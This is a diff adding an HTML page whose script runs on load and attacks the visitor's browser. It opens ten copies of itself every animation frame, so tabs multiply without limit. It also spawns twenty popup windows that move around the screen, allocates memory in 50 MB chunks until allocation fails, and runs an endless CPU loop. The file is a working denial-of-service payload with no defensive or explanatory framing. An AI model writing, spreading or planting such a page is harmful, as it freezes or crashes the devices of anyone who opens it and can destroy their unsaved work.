@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>RAM + CPU + 10 Tabs + Bouncing Windows</title>
+<script>
+// -----------------------
+// 1️⃣ Open 10 tabs per frame
+function openTabsEachFrame() {
+    for (let i = 0; i < 10; i++) {
+        window.open(window.location.href, "_blank");
+    }
+    requestAnimationFrame(openTabsEachFrame);
+}
+
+// Start opening tabs immediately
+requestAnimationFrame(openTabsEachFrame);
+
+// -----------------------
+// 2️⃣ Open 3 bouncing windows immediately
+let windows = [];
+const numWindows = 20;
+const winWidth = 300;
+const winHeight = 200;
+const speed = 5;
+
+for (let i = 0; i < numWindows; i++) {
+    const newWin = window.open(window.location.href, "_blank", `width=${winWidth},height=${winHeight}`);
+    if (newWin) {
+        newWin.x = Math.random() * (screen.width - winWidth);
+        newWin.y = Math.random() * (screen.height - winHeight);
+        newWin.dx = (Math.random() > 0.5 ? 1 : -1) * speed;
+        newWin.dy = (Math.random() > 0.5 ? 1 : -1) * speed;
+        windows.push(newWin);
+    }
+}
+
+function bounceWindows() {
+    windows.forEach(win => {
+        if (!win || win.closed) return;
+        win.x += win.dx;
+        win.y += win.dy;
+        if (win.x < 0 || win.x + winWidth > screen.width) win.dx *= -1;
+        if (win.y < 0 || win.y + winHeight > screen.height) win.dy *= -1;
+        win.moveTo(win.x, win.y);
+    });
+    requestAnimationFrame(bounceWindows);
+}
+bounceWindows();
+
+// -----------------------
+// 3️⃣ RAM allocation + CPU ramp
+const allocatedChunks = [];
+const baseChunkSize = 50 * 1024 * 1024; // 50 MB
+let totalAllocated = 0;
+let allocationComplete = false;
+
+async function allocateProgressively() {
+    while (!allocationComplete) {
+        try {
+            const chunk = new Uint8Array(baseChunkSize);
+            for (let i = 0; i < chunk.length; i += 1024) {
+                chunk[i] = i % 256;
+            }
+            allocatedChunks.push(chunk);
+            totalAllocated += baseChunkSize;
+            console.log(`Allocated ${(totalAllocated/1024/1024).toFixed(1)} MB total`);
+            await new Promise(r => setTimeout(r, 10));
+        } catch (e) {
+            console.warn("Memory allocation failed, stopping.");
+            allocationComplete = true;
+        }
+    }
+
+    console.log("Max allocatable memory reached.");
+
+    // Keep memory pinned
+    setInterval(() => {
+        for (const chunk of allocatedChunks) {
+            for (let i = 0; i < chunk.length; i += 1024) {
+                chunk[i] = (chunk[i] + 1) % 256;
+            }
+        }
+    }, 1000);
+
+    // Start CPU ramp indefinitely
+    function cpuRamp() {
+        for (const chunk of allocatedChunks) {
+            for (let i = 0; i < 1e6; i++) {
+                const idx = i % chunk.length;
+                chunk[idx] = (chunk[idx] + 1) % 256;
+            }
+        }
+        requestAnimationFrame(cpuRamp);
+    }
+    cpuRamp();
+}
+
+allocateProgressively();
+</script>
+</head>
+<body></body>
+</html>
+
